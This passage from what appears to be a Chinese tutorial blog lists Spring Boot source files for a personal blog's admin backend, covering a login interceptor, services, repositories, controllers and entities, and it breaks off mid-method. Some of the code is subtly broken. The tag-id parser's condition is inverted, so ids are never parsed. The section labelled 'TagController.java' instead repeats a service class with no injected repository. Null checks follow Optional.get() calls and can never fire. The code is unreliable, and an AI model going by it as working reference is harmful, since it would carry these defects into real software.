&#123;\n\n    &#x2F;&#x2F;WebMvcConfigurerAdapter这个也过时了\n    \n    @Override\n    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception &#123;\n\n        if (request.getSession().getAttribute(&quot;user&quot;) &#x3D;&#x3D; null)&#123;\n            response.sendRedirect(&quot;&#x2F;admin&quot;);\n            return false;\n        &#125;\n\n        return true;\n    &#125;\n&#125;\nWebConfig.java Blog后台页面权限(拦截配置)类\npackage com.cxkj.blog.interceptor;\n\n\nimport org.springframework.context.annotation.Configuration;\nimport org.springframework.web.servlet.config.annotation.InterceptorRegistry;\nimport org.springframework.web.servlet.config.annotation.WebMvcConfigurerAdapter;\n\n&#x2F;**\n *  Created by Arvin on 2021&#x2F;2&#x2F;5.\n *&#x2F;\n@Configuration\npublic class WebConfig extends WebMvcConfigurerAdapter &#123;\n\n    &#x2F;&#x2F;WebMvcConfigurerAdapter这个过时了\n    \n    @Override\n    public void addInterceptors(InterceptorRegistry registry) &#123;\n        registry.addInterceptor(new LongInterceptor()).addPathPatterns(&quot;&#x2F;admin&#x2F;**&quot;)\n                .excludePathPatterns(&quot;&#x2F;admin&quot;)\n                .excludePathPatterns(&quot;&#x2F;admin&#x2F;login&quot;);\n    &#125;\n\n&#125;\n关于弃用类整改LongInterceptor.java Blog后台页面权限(登录过滤)类\npackage com.cxkj.blog.interceptor;\n\nimport org.springframework.web.servlet.HandlerInterceptor;\nimport org.springframework.web.servlet.handler.HandlerInterceptorAdapter;\n\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\n&#x2F;**\n *  Created by Arvin on 2021&#x2F;2&#x2F;5.\n *&#x2F;\n\npublic class LongInterceptor implements HandlerInterceptor &#123;\n\n    @Override\n    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception &#123;\n\n        if (request.getSession().getAttribute(&quot;user&quot;) &#x3D;&#x3D; null)&#123;\n            response.sendRedirect(&quot;&#x2F;admin&quot;);\n            return false;\n        &#125;\n\n        return true;\n    &#125;\n&#125;\nWebConfig.java Blog后台页面权限(拦截配置)类\npackage com.cxkj.blog.interceptor;\n\n\n\nimport org.springframework.context.annotation.Configuration;\nimport org.springframework.web.servlet.config.annotation.InterceptorRegistry;\nimport org.springframework.web.servlet.config.annotation.WebMvcConfigurer;\n\n&#x2F;**\n *  Created by Arvin on 2021&#x2F;2&#x2F;5.\n *&#x2F;\n@Configuration\npublic class WebConfig implements WebMvcConfigurer &#123;\n\n    @Override\n    public void addInterceptors(InterceptorRegistry registry) &#123;\n        registry.addInterceptor(new LongInterceptor()).addPathPatterns(&quot;&#x2F;admin&#x2F;**&quot;)\n                .excludePathPatterns(&quot;&#x2F;admin&quot;)\n                .excludePathPatterns(&quot;&#x2F;admin&#x2F;login&quot;);\n    &#125;\n\n&#125;\n分类业务处理TypeService.java 分类业务逻辑处理接口\npackage com.cxkj.blog.service;\n\nimport com.cxkj.blog.pojo.Type;\nimport org.springframework.data.domain.Page;\nimport org.springframework.data.domain.Pageable;\n\nimport java.util.List;\n\n&#x2F;**\n *  Created by Arvin on 2021&#x2F;2&#x2F;6.\n *&#x2F;\n\npublic interface TypeService &#123;\n\n    Type saveType(Type type);\n\n    Type getType(Long id);\n\n    Type getTypeByName(String name);\n\n    Page&lt;Type&gt; listType(Pageable pageable);\n\n    List&lt;Type&gt; listType();\n\n    Type updateType(Long id,Type type);\n\n    void deleteType(Long id);\n&#125;\nTypeServiceImpl.java 分类业务逻辑处理实现类\npackage com.cxkj.blog.service;\n\nimport com.cxkj.blog.NotFoundException;\nimport com.cxkj.blog.dao.TypeRepository;\nimport com.cxkj.blog.pojo.Type;\nimport org.springframework.beans.BeanUtils;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.data.domain.Page;\nimport org.springframework.data.domain.Pageable;\nimport org.springframework.stereotype.Service;\nimport org.springframework.transaction.annotation.Transactional;\n\nimport java.util.List;\n\n&#x2F;**\n *  Created by Arvin on 2021&#x2F;2&#x2F;6.\n *&#x2F;\n@Service\npublic class TypeServiceImpl implements TypeService&#123;\n\n    @Autowired\n    private TypeRepository typeRepository;\n\n    @Transactional\n    @Override\n    public Type saveType(Type type) &#123;\n        return typeRepository.save(type);\n    &#125;\n\n    @Transactional\n    @Override\n    public Type getType(Long id) &#123;\n        return typeRepository.findById(id).get();\n    &#125;\n\n    @Override\n    public Type getTypeByName(String name) &#123;\n        return typeRepository.findByName(name);\n    &#125;\n\n    @Transactional\n    @Override\n    public Page&lt;Type&gt; listType(Pageable pageable) &#123;\n        return typeRepository.findAll(pageable);\n    &#125;\n\n    @Override\n    public List&lt;Type&gt; listType() &#123;\n        return typeRepository.findAll();\n    &#125;\n\n    @Transactional\n    @Override\n    public Type updateType(Long id, Type type) &#123;\n        Type t &#x3D; typeRepository.findById(id).get();\n        if (t &#x3D;&#x3D; null)&#123;\n            throw new NotFoundException(&quot;您查找的信息不存在(︶︹︺)&quot;);\n        &#125;\n        BeanUtils.copyProperties(type,t);\n        return typeRepository.save(t);\n    &#125;\n\n    @Transactional\n    @Override\n    public void deleteType(Long id) &#123;\n        typeRepository.deleteById(id);\n    &#125;\n&#125;\nTypeRepository.java 分类业务 SQL操作接口\npackage com.cxkj.blog.dao;\n\nimport com.cxkj.blog.pojo.Type;\nimport org.springframework.data.jpa.repository.JpaRepository;\n\n&#x2F;**\n *  Created by Arvin on 2021&#x2F;2&#x2F;6.\n *&#x2F;\n\npublic interface TypeRepository extends JpaRepository&lt;Type,Long&gt; &#123;\n\n    Type findByName(String name);\n&#125;\nTypeController.java Web层操作\npackage com.cxkj.blog.web.admin;\n\nimport com.cxkj.blog.pojo.Type;\nimport com.cxkj.blog.service.TypeService;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.data.domain.Pageable;\nimport org.springframework.data.domain.Sort;\nimport org.springframework.data.web.PageableDefault;\nimport org.springframework.stereotype.Controller;\nimport org.springframework.ui.Model;\nimport org.springframework.validation.BindingResult;\nimport org.springframework.web.bind.annotation.GetMapping;\nimport org.springframework.web.bind.annotation.PathVariable;\nimport org.springframework.web.bind.annotation.PostMapping;\nimport org.springframework.web.bind.annotation.RequestMapping;\nimport org.springframework.web.servlet.mvc.support.RedirectAttributes;\n\nimport javax.validation.Valid;\n\n&#x2F;**\n *  Created by Arvin on 2021&#x2F;2&#x2F;6.\n *&#x2F;\n@Controller\n@RequestMapping(&quot;&#x2F;admin&quot;)\npublic class TypeController &#123;\n\n    @Autowired\n    private TypeService typeService;\n\n    @GetMapping(&quot;&#x2F;types&quot;)\n    public String types(@PageableDefault(size &#x3D; 10,sort &#x3D; &#123;&quot;id&quot;&#125;,direction &#x3D; Sort.Direction.DESC)\n                                Pageable pageable, Model model)&#123;\n\n        model.addAttribute(&quot;page&quot;,typeService.listType(pageable));\n        return &quot;&#x2F;admin&#x2F;types&quot;;\n    &#125;\n\n    @GetMapping(&quot;&#x2F;types&#x2F;input&quot;)\n    public String input(Model model)&#123;\n        model.addAttribute(&quot;type&quot;,new Type());\n        return &quot;&#x2F;admin&#x2F;types-input&quot;;\n    &#125;\n\n    @GetMapping(&quot;types&#x2F;&#123;id&#125;&#x2F;input&quot;)\n    public String editInput(@PathVariable Long id, Model model)&#123;\n        model.addAttribute(&quot;type&quot;,typeService.getType(id));\n        return &quot;&#x2F;admin&#x2F;types-input&quot;;\n    &#125;\n\n    @PostMapping(&quot;&#x2F;types&quot;)\n    public String post(@Valid Type type, BindingResult result, RedirectAttributes attributes)&#123;\n        Type typename &#x3D; typeService.getTypeByName(type.getName());\n        if (typename !&#x3D; null)&#123;\n            result.rejectValue(&quot;name&quot;,&quot;nameError&quot;,&quot;管理员大大，这个分类已经有了。((٩(&#x2F;&#x2F;̀Д&#x2F;́&#x2F;)۶))做人要专一哦！&quot;);\n        &#125;\n        if (result.hasErrors())&#123;\n            return &quot;&#x2F;admin&#x2F;types-input&quot;;\n        &#125;\n        Type t &#x3D;  typeService.saveType(type);\n        if (t &#x3D;&#x3D; null)&#123;\n            attributes.addFlashAttribute(&quot;message&quot;,&quot;新增失败 ﾍ(;´Д｀ﾍ),管理员大大重新试下吧&quot;);\n        &#125;else &#123;\n            attributes.addFlashAttribute(&quot;message&quot;,&quot;新增成功 ≖‿≖✧ 快去发布新内容吧&quot;);\n        &#125;\n        return &quot;redirect:..&#x2F;admin&#x2F;types&quot;;\n    &#125;\n\n    @PostMapping(&quot;&#x2F;types&#x2F;&#123;id&#125;&quot;)\n    public String editPost(@Valid Type type, BindingResult result,@PathVariable Long id, RedirectAttributes attributes)&#123;\n        Type typename &#x3D; typeService.getTypeByName(type.getName());\n        if (typename !&#x3D; null)&#123;\n            result.rejectValue(&quot;name&quot;,&quot;nameError&quot;,&quot;管理员大大，这个分类已经有了。((٩(&#x2F;&#x2F;̀Д&#x2F;́&#x2F;)۶))做人要专一哦！&quot;);\n        &#125;\n        if (result.hasErrors())&#123;\n            return &quot;&#x2F;admin&#x2F;types-input&quot;;\n        &#125;\n        Type t &#x3D;  typeService.updateType(id,type);\n        if (t &#x3D;&#x3D; null)&#123;\n            attributes.addFlashAttribute(&quot;message&quot;,&quot;更新失败（⊙o⊙）,管理员大大重新试下吧&quot;);\n        &#125;else &#123;\n            attributes.addFlashAttribute(&quot;message&quot;,&quot;更新成功 (≥◇≤) 快去发布新内容吧&quot;);\n        &#125;\n        return &quot;redirect:..&#x2F;types&quot;;\n    &#125;\n\n    @GetMapping(&quot;&#x2F;types&#x2F;&#123;id&#125;&#x2F;delete&quot;)\n    public String delete(@PathVariable Long id,RedirectAttributes attributes)&#123;\n        typeService.deleteType(id);\n        attributes.addFlashAttribute(&quot;message&quot;,&quot;删除成功,可能是管理员大大不喜欢它了吧(.◕ฺˇд ˇ◕ฺ)&quot;);\n        return &quot;redirect:..&#x2F;&quot;;\n    &#125;\n&#125;\n标签业务处理TagService.java 标签业务逻辑处理接口\npackage com.cxkj.blog.service;\n\nimport com.cxkj.blog.pojo.Tag;\nimport org.springframework.data.domain.Page;\nimport org.springframework.data.domain.Pageable;\n\nimport java.util.List;\n\n&#x2F;**\n *  Created by Arvin on 2021&#x2F;2&#x2F;7.\n *&#x2F;\n\npublic interface TagService &#123;\n\n    Tag saveTag(Tag tag);\n\n    Tag getTag(Long id);\n\n    Tag getTagByName(String name);\n\n    Page&lt;Tag&gt; listTag(Pageable pageable);\n\n    List&lt;Tag&gt; listTag();\n\n    List&lt;Tag&gt; listTag(String ids);\n\n    Tag updateTag(Long id,Tag tag);\n\n    void deleteTag(Long id);\n&#125;\nTagServiceImpl.java 标签业务逻辑处理实现类\npackage com.cxkj.blog.service;\n\nimport com.cxkj.blog.NotFoundException;\nimport com.cxkj.blog.dao.TagRepository;\nimport com.cxkj.blog.pojo.Tag;\nimport org.springframework.beans.BeanUtils;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.data.domain.Page;\nimport org.springframework.data.domain.Pageable;\nimport org.springframework.stereotype.Service;\nimport org.springframework.transaction.annotation.Transactional;\nimport org.thymeleaf.util.StringUtils;\n\nimport java.util.ArrayList;\nimport java.util.List;\n\n&#x2F;**\n *  Created by Arvin on 2021&#x2F;2&#x2F;7.\n *&#x2F;\n@Service\npublic class TagServiceImpl implements TagService&#123;\n\n    @Autowired\n    private TagRepository tagRepository;\n\n    @Transactional\n    @Override\n    public Tag saveTag(Tag tag) &#123;\n        return tagRepository.save(tag);\n    &#125;\n\n    @Transactional\n    @Override\n    public Tag getTag(Long id) &#123;\n        return tagRepository.findById(id).get();\n    &#125;\n\n    @Transactional\n    @Override\n    public Tag getTagByName(String name) &#123;\n        return tagRepository.findByName(name);\n    &#125;\n\n    @Transactional\n    @Override\n    public Page&lt;Tag&gt; listTag(Pageable pageable) &#123;\n        return tagRepository.findAll(pageable);\n    &#125;\n\n    @Override\n    public List&lt;Tag&gt; listTag() &#123;\n        return tagRepository.findAll();\n    &#125;\n\n    @Override\n    public List&lt;Tag&gt; listTag(String ids) &#123;  &#x2F;&#x2F;1,2,3\n        return tagRepository.findAllById(convertToList(ids));\n    &#125;\n\n    private List&lt;Long&gt; convertToList(String ids)&#123;\n        List&lt;Long&gt; list &#x3D; new ArrayList&lt;&gt;();\n        if (&quot;&quot;.equals(ids) &amp;&amp; ids !&#x3D; null)&#123;\n            String[] idarray &#x3D; ids.split(&quot;,&quot;);\n            for (int i&#x3D;0; i&lt;idarray.length; i++)&#123;\n                list.add(new Long(idarray[i]));\n            &#125;\n        &#125;\n        return list;\n    &#125;\n\n    @Transactional\n    @Override\n    public Tag updateTag(Long id, Tag tag) &#123;\n        Tag t &#x3D; tagRepository.findById(id).get();\n        if (t &#x3D;&#x3D; null)&#123;\n            throw new NotFoundException(&quot;您查找的信息不存在(︶︹︺)&quot;);\n        &#125;\n        BeanUtils.copyProperties(tag,t);\n        return tagRepository.save(t);\n    &#125;\n\n    @Transactional\n    @Override\n    public void deleteTag(Long id) &#123;\n        tagRepository.deleteById(id);\n    &#125;\n&#125;\n\nTagRepository.java 标签业务 SQL操作接口\npackage com.cxkj.blog.dao;\n\nimport com.cxkj.blog.pojo.Tag;\nimport org.springframework.data.jpa.repository.JpaRepository;\n\n&#x2F;**\n *  Created by Arvin on 2021&#x2F;2&#x2F;7.\n *&#x2F;\n\npublic interface TagRepository extends JpaRepository&lt;Tag,Long&gt; &#123;\n    \n    Tag findByName(String name);\n&#125;\nTagController.java WEB操作\npackage com.cxkj.blog.service;\n\nimport com.cxkj.blog.NotFoundException;\nimport com.cxkj.blog.dao.TagRepository;\nimport com.cxkj.blog.pojo.Tag;\nimport org.springframework.beans.BeanUtils;\nimport org.springframework.data.domain.Page;\nimport org.springframework.data.domain.Pageable;\nimport org.springframework.stereotype.Service;\nimport org.springframework.transaction.annotation.Transactional;\n\n&#x2F;**\n *  Created by Arvin on 2021&#x2F;2&#x2F;7.\n *&#x2F;\n@Service\npublic class TagServiceImpl implements TagService&#123;\n\n    private TagRepository tagRepository;\n\n    @Transactional\n    @Override\n    public Tag saveTag(Tag tag) &#123;\n        return tagRepository.save(tag);\n    &#125;\n\n    @Transactional\n    @Override\n    public Tag getTag(Long id) &#123;\n        return tagRepository.findById(id).get();\n    &#125;\n\n    @Transactional\n    @Override\n    public Tag getTagByName(String name) &#123;\n        return tagRepository.findByName(name);\n    &#125;\n\n    @Transactional\n    @Override\n    public Page&lt;Tag&gt; listTag(Pageable pageable) &#123;\n        return tagRepository.findAll(pageable);\n    &#125;\n\n    @Transactional\n    @Override\n    public Tag updateTag(Long id, Tag tag) &#123;\n        Tag t &#x3D; tagRepository.findById(id).get();\n        if (t &#x3D;&#x3D; null)&#123;\n            throw new NotFoundException(&quot;您查找的信息不存在(︶︹︺)&quot;);\n        &#125;\n        BeanUtils.copyProperties(tag,t);\n        return tagRepository.save(t);\n    &#125;\n\n    @Transactional\n    @Override\n    public void deleteTag(Long id) &#123;\n        tagRepository.deleteById(id);\n    &#125;\n&#125;\n博客业务处理BlogService.java 博客业务处理逻辑接口\npackage com.cxkj.blog.service;\n\nimport com.cxkj.blog.pojo.Blog;\nimport com.cxkj.blog.vo.BlogQuery;\nimport org.springframework.data.domain.Page;\nimport org.springframework.data.domain.Pageable;\n\n&#x2F;**\n *  Created by Arvin on 2021&#x2F;2&#x2F;8.\n *&#x2F;\n\npublic interface BlogService &#123;\n\n    Blog getBlog(Long id);\n\n    Page&lt;Blog&gt; listBlog(Pageable pageable, BlogQuery blogQuery);\n\n    Blog saveBlog(Blog blog);\n\n    Blog updateBlog(Long id,Blog blog);\n\n    void deleteBlog(Long id);\n&#125;\nBlogServiceImpl.java 博客业务处理逻辑实现类\npackage com.cxkj.blog.service;\n\nimport com.cxkj.blog.NotFoundException;\nimport com.cxkj.blog.dao.BlogRepository;\nimport com.cxkj.blog.pojo.Blog;\nimport com.cxkj.blog.pojo.Type;\nimport com.cxkj.blog.util.MyBeanUtils;\nimport com.cxkj.blog.vo.BlogQuery;\nimport org.springframework.beans.BeanUtils;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.data.domain.Page;\nimport org.springframework.data.domain.Pageable;\nimport org.springframework.data.jpa.domain.Specification;\nimport org.springframework.stereotype.Service;\nimport org.springframework.transaction.annotation.Transactional;\n\nimport javax.persistence.criteria.CriteriaBuilder;\nimport javax.persistence.criteria.CriteriaQuery;\nimport javax.persistence.criteria.Predicate;\nimport javax.persistence.criteria.Root;\nimport java.util.ArrayList;\nimport java.util.Date;\nimport java.util.List;\n\n&#x2F;**\n *  Created by Arvin on 2021&#x2F;2&#x2F;8.\n *&#x2F;\n@Service\npublic class BlogServiceImpl implements BlogService&#123;\n\n    @Autowired\n    private BlogRepository blogRepository;\n\n    @Override\n    public Blog getBlog(Long id) &#123;\n        return blogRepository.findById(id).get();\n    &#125;\n\n    @Override\n    public Page&lt;Blog&gt; listBlog(Pageable pageable, BlogQuery blogQuery) &#123;\n\n        return blogRepository.findAll(new Specification&lt;Blog&gt;() &#123;\n            @Override\n            public Predicate toPredicate(Root&lt;Blog&gt; root, CriteriaQuery&lt;?&gt; criteriaQuery, CriteriaBuilder criteriaBuilder) &#123;\n                List&lt;Predicate&gt; predicateList &#x3D; new ArrayList&lt;&gt;();\n                if (!&quot;&quot;.equals(blogQuery.getTitle()) &amp;&amp; blogQuery.getTitle() !&#x3D; null)&#123;\n                    predicateList.add(criteriaBuilder.like(root.&lt;String&gt;get(&quot;title&quot;),&quot;%&quot;+blogQuery.getTitle()+&quot;%&quot;));\n                &#125;\n                if (blogQuery.getTypeID() !&#x3D; null)&#123;\n                    predicateList.add(criteriaBuilder.equal(root.&lt;Type&gt;get(&quot;type&quot;).get(&quot;id&quot;),blogQuery.getTypeID()));\n                &#125;\n                if (blogQuery.isRecommend())&#123;\n                    predicateList.add(criteriaBuilder.equal(root.&lt;Boolean&gt;get(&quot;recommend&quot;),blogQuery.isRecommend()));\n                &#125;\n                criteriaQuery.where(predicateList.toArray(new Predicate[predicateList.size()]));\n                return null;\n            &#125;\n        &#125;,pageable);\n    &#125;\n\n    @Transactional\n    @Override\n    public Blog saveBlog(Blog blog) &#123;\n        if (blog.getId() &#x3D;&#x3D; null)&#123;\n            blog.setCreateTime(new Date());\n            blog.setUpdateTime(new Date());\n            blog.setViews(0);\n        &#125;else &#123;\n            blog.setUpdateTime(new Date());\n        &#125;\n        return blogRepository.save(blog);\n    &#125;\n\n    @Transactional\n    @Override\n    public Blog updateBlog(Long id, Blog blog) &#123;\n        Blog b &#x3D; blogRepository.findById(id).get();\n        if (b &#x3D;&#x3D; null)&#123;\n            throw new NotFoundException(&quot;管理员大大,这个博客不存在哦！～(　TロT)σ&quot;);\n        &#125;\n        BeanUtils.copyProperties(blog,b, MyBeanUtils.getNullPropertyNames(blog));\n        b.setUpdateTime(new Date());\n        return blogRepository.save(b);\n    &#125;\n\n    @Transactional\n    @Override\n    public void deleteBlog(Long id) &#123;\n        blogRepository.deleteById(id);\n    &#125;\n&#125;\n\nBlogRepository.java 博客业务 SQL操作接口\npackage com.cxkj.blog.dao;\n\nimport com.cxkj.blog.pojo.Blog;\nimport org.springframework.data.jpa.repository.JpaRepository;\nimport org.springframework.data.jpa.repository.JpaSpecificationExecutor;\n\n&#x2F;**\n *  Created by Arvin on 2021&#x2F;2&#x2F;8.\n *&#x2F;\n\npublic interface BlogRepository extends JpaRepository&lt;Blog,Long&gt;, JpaSpecificationExecutor&lt;Blog&gt; &#123;\n    \n&#125;\nBlogController.java WEB操作\npackage com.cxkj.blog.web.admin;\n\nimport com.cxkj.blog.pojo.Blog;\nimport com.cxkj.blog.pojo.Tag;\nimport com.cxkj.blog.pojo.User;\nimport com.cxkj.blog.service.BlogService;\nimport com.cxkj.blog.service.TagService;\nimport com.cxkj.blog.service.TypeService;\nimport com.cxkj.blog.vo.BlogQuery;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.data.domain.Pageable;\nimport org.springframework.data.domain.Sort;\nimport org.springframework.data.web.PageableDefault;\nimport org.springframework.stereotype.Controller;\nimport org.springframework.ui.Model;\nimport org.springframework.web.bind.annotation.GetMapping;\nimport org.springframework.web.bind.annotation.PathVariable;\nimport org.springframework.web.bind.annotation.PostMapping;\nimport org.springframework.web.bind.annotation.RequestMapping;\nimport org.springframework.web.servlet.mvc.support.RedirectAttributes;\n\nimport javax.servlet.http.HttpSession;\n\n&#x2F;**\n *  Created by Arvin on 2021&#x2F;2&#x2F;5.\n *&#x2F;\n@Controller\n@RequestMapping(&quot;&#x2F;admin&quot;)\npublic class BlogController &#123;\n\n    private static final  String INPUT &#x3D; &quot;&#x2F;admin&#x2F;blogs-input&quot;;\n    private static final  String LIST &#x3D; &quot;&#x2F;admin&#x2F;blogs&quot;;\n    private static final  String REDIRECT_LIST &#x3D; &quot;redirect:&#x2F;admin&#x2F;blogs&quot;;\n\n    @Autowired\n    private BlogService blogService;\n\n    @Autowired\n    private TypeService typeService;\n\n    @Autowired\n    private TagService tagService;\n\n    @GetMapping(&quot;&#x2F;blogs&quot;)\n    public String blogs(@PageableDefault(size &#x3D; 10,sort &#x3D; &#123;&quot;updateTime&quot;&#125;,direction &#x3D; Sort.Direction.DESC) Pageable pageable, BlogQuery blogQuery, Model model)&#123;\n        model.addAttribute(&quot;types&quot;,typeService.listType());\n        model.addAttribute(&quot;page&quot;,blogService.listBlog(pageable,blogQuery));\n        return LIST;\n    &#125;\n\n    @PostMapping(&quot;&#x2F;blogs&#x2F;search&quot;)\n    public String search(@PageableDefault(size &#x3D; 10,sort &#x3D; &#123;&quot;updateTime&quot;&#125;,direction &#x3D; Sort.Direction.DESC) Pageable pageable,BlogQuery blogQuery,Model model)&#123;\n        model.addAttribute(&quot;page&quot;,blogService.listBlog(pageable,blogQuery));\n        return &quot;&#x2F;admin&#x2F;blogs :: blogList&quot;;\n    &#125;\n\n    @GetMapping(&quot;&#x2F;blogs&#x2F;input&quot;)\n    public String input(Model model)&#123;\n        setTypeAndTag(model);\n        model.addAttribute(&quot;blog&quot;,new Blog());\n        return INPUT;\n    &#125;\n\n    private void setTypeAndTag(Model model)&#123;\n        model.addAttribute(&quot;types&quot;,typeService.listType());\n        model.addAttribute(&quot;tags&quot;,tagService.listTag());\n    &#125;\n\n    @GetMapping(&quot;&#x2F;blogs&#x2F;&#123;id&#125;&#x2F;input&quot;)\n    public String editInput (@PathVariable Long id, Model model)&#123;\n        setTypeAndTag(model);\n        Blog blog &#x3D; blogService.getBlog(id);\n        blog.init();\n        model.addAttribute(&quot;blog&quot;,blog);\n        return INPUT;\n    &#125;\n\n    @PostMapping(&quot;&#x2F;blogs&quot;)\n    public String post(Blog blog, RedirectAttributes attributes, HttpSession session)&#123;\n        blog.setUser((User) session.getAttribute(&quot;user&quot;));\n        blog.setType(typeService.getType(blog.getType().getId()));\n        blog.setTags(tagService.listTag(blog.getTagIds()));\n        Blog b;\n        if (blog.getId() &#x3D;&#x3D; null)&#123;\n            b &#x3D; blogService.saveBlog(blog);\n        &#125;else &#123;\n            b &#x3D; blogService.updateBlog(blog.getId(),blog);\n        &#125;\n        if (b &#x3D;&#x3D; null)&#123;\n            attributes.addFlashAttribute(&quot;message&quot;,&quot;操作失败 ﾍ(;´Д｀ﾍ),管理员大大重新试下吧&quot;);\n        &#125;else &#123;\n            attributes.addFlashAttribute(&quot;message&quot;,&quot;操作成功 ≖‿≖✧ 快去发布新内容吧&quot;);\n        &#125;\n        return REDIRECT_LIST;\n    &#125;\n\n    @GetMapping(&quot;&#x2F;blogs&#x2F;&#123;id&#125;&#x2F;delete&quot;)\n    public String delete(@PathVariable Long id,RedirectAttributes attributes)&#123;\n        blogService.deleteBlog(id);\n        attributes.addFlashAttribute(&quot;message&quot;,&quot;删除成功,期待您发布更加美好的内容︿(￣︶￣)︿&quot;);\n        return REDIRECT_LIST;\n    &#125;\n&#125;\nBlogQuery.java 博客搜索查询类\npackage com.cxkj.blog.vo;\n\n&#x2F;**\n *  Created by Arvin on 2021&#x2F;2&#x2F;8.\n *&#x2F;\n\npublic class BlogQuery &#123;\n    \n    private String title;\n    private Long typeID;\n    private boolean recommend;\n\n    public BlogQuery() &#123;\n    &#125;\n\n    public String getTitle() &#123;\n        return title;\n    &#125;\n\n    public void setTitle(String title) &#123;\n        this.title &#x3D; title;\n    &#125;\n\n    public Long getTypeID() &#123;\n        return typeID;\n    &#125;\n\n    public void setTypeID(Long typeID) &#123;\n        this.typeID &#x3D; typeID;\n    &#125;\n\n    public boolean isRecommend() &#123;\n        return recommend;\n    &#125;\n\n    public void setRecommend(boolean recommend) &#123;\n        this.recommend &#x3D; recommend;\n    &#125;\n&#125;\nBlog.java 博客实体类\npackage com.cxkj.blog.pojo;\n\nimport javax.persistence.*;\nimport java.util.ArrayList;\nimport java.util.Date;\nimport java.util.List;\n\n&#x2F;**\n *  Created by Arvin on 2021&#x2F;2&#x2F;4.\n *&#x2F;\n@Entity\n@Table(name &#x3D; &quot;t_blog&quot;)\npublic class Blog &#123;\n\n    @Id\n    @GeneratedValue\n    private Long id;\n\n    private String title;\n\n    @Basic(fetch &#x3D; FetchType.LAZY)\n    @Lob\n    private String content;\n    private String firstPicture;\n    private String flag;\n    private Integer views;\n    private boolean appreciation;\n    private boolean shareStatement;\n    private boolean commentabled;\n    private boolean published;\n    private boolean recommend;\n    @Temporal(TemporalType.TIMESTAMP)\n    private Date createTime;\n    @Temporal(TemporalType.TIMESTAMP)\n    private Date updateTime;\n\n    @ManyToOne\n    private Type type;\n\n    @ManyToMany(cascade &#x3D; &#123;CascadeType.PERSIST&#125;)\n    private List&lt;Tag&gt; tags &#x3D; new ArrayList&lt;&gt;();\n\n    @ManyToOne\n    private User user;\n\n    @OneToMany(mappedBy &#x3D; &quot;blog&quot;)\n    private List&lt;Comment&gt; comments &#x3D; new ArrayList&lt;&gt;();\n\n    @Transient\n    private String tagIds;\n\n    private String description;\n\n    public Blog() &#123;\n    &#125;\n\n    public Long getId() &#123;\n        return id;\n    &#125;\n\n    public void setId(Long id) &#123;\n        this.id &#x3D; id;\n    &#125;\n\n    public String getTitle() &#123;\n        return title;\n    &#125;\n\n    public void setTitle(String title) &#123;\n        this.title &#x3D; title;\n    &#125;\n\n    public String getContent() &#123;\n        return content;\n    &#125;\n\n    public void setContent(String content) &#123;\n        this.content &#x3D; content;\n    &#125;\n\n    public String getFirstPicture() &#123;\n        return firstPicture;\n    &#125;\n\n    public void setFirstPicture(String firstPicture) &#123;\n        this.firstPicture &#x3D; firstPicture;\n    &#125;\n\n    public String getFlag() &#123;\n        return flag;\n    &#125;\n\n    public void setFlag(String flag) &#123;\n        this.flag &#x3D; flag;\n    &#125;\n\n    public Integer getViews() &#123;\n        return views;\n    &#125;\n\n    public void setViews(Integer views) &#123;\n        this.views &#x3D; views;\n    &#125;\n\n    public boolean isAppreciation() &#123;\n        return appreciation;\n    &#125;\n\n    public void setAppreciation(boolean appreciation) &#123;\n        this.appreciation &#x3D; appreciation;\n    &#125;\n\n    public boolean isShareStatement() &#123;\n        return shareStatement;\n    &#125;\n\n    public void setShareStatement(boolean shareStatement) &#123;\n        this.shareStatement &#x3D; shareStatement;\n    &#125;\n\n    public boolean isCommentabled() &#123;\n        return commentabled;\n    &#125;\n\n    public void setCommentabled(boolean commentabled) &#123;\n        this.commentabled &#x3D; commentabled;\n    &#125;\n\n    public boolean isPublished() &#123;\n        return published;\n    &#125;\n\n    public void setPublished(boolean published) &#123;\n        this.published &#x3D; published;\n    &#125;\n\n    public boolean isRecommend() &#123;\n        return recommend;\n    &#125;\n\n    public void setRecommend(boolean recommend) &#123;\n        this.recommend &#x3D; recommend;\n    &#125;\n\n    public Date getCreateTime() &#123;\n        return createTime;\n    &#125;\n\n    public void setCreateTime(Date createTime) &#123;\n        this.createTime &#x3D; createTime;\n    &#125;\n\n    public Date getUpdateTime() &#123;\n        return updateTime;\n    &#125;\n\n    public void setUpdateTime(Date updateTime) &#123;\n        this.updateTime &#x3D; updateTime;\n    &#125;\n\n    public Type getType() &#123;\n        return type;\n    &#125;\n\n    public void setType(Type type) &#123;\n        this.type &#x3D; type;\n    &#125;\n\n    public List&lt;Tag&gt; getTags() &#123;\n        return tags;\n    &#125;\n\n    public void setTags(List&lt;Tag&gt; tags) &#123;\n        this.tags &#x3D; tags;\n    &#125;\n\n    public User getUser() &#123;\n        return user;\n    &#125;\n\n    public void setUser(User user) &#123;\n        this.user &#x3D; user;\n    &#125;\n\n    public List&lt;Comment&gt; getComments() &#123;\n        return comments;\n    &#125;\n\n    public void setComments(List&lt;Comment&gt; comments) &#123;\n        this.comments &#x3D; comments;\n    &#125;\n\n    public String getTagIds() &#123;\n        return tagIds;\n    &#125;\n\n    public void setTagIds(String tagIds) &#123;\n        this.tagIds &#x3D; tagIds;\n    &#125;\n\n    public String getDescription() &#123;\n        return description;\n    &#125;\n\n    public void setDescription(String description) &#123;\n        this.description &#x3D; description;\n    &#125;\n\n    &#x2F;&#x2F;初始化tagIds方法\n    public void init()&#123;\n        this.tagIds &#x3D; tagsToIds(this.getTags());\n    &#125;\n    private String tagsToIds(List&lt;Tag&gt; tags)&#123;\n        if (!tags.isEmpty())&#123;\n            StringBuffer ids &#x3D; new StringBuffer();\n            boolean flag &#x3D; false;\n            for (Tag tag : tags)&#123;\n                if (flag)&#123;\n                    ids.append(&quot;,&quot;);\n                &#125;else &#123;\n                    flag &#x3D; true;\n                &#125;\n                ids.append(tag.getId());\n            &#125;\n            return ids.toString();\n        &#125;else &#123;\n            return tagIds;\n        &#125;\n    &#125;\n\n    @Override\n    public String toString() &#123;\n        return &quot;Blog&#123;&quot; +\n                &quot;id&#x3D;&quot; + id +\n                &quot;, 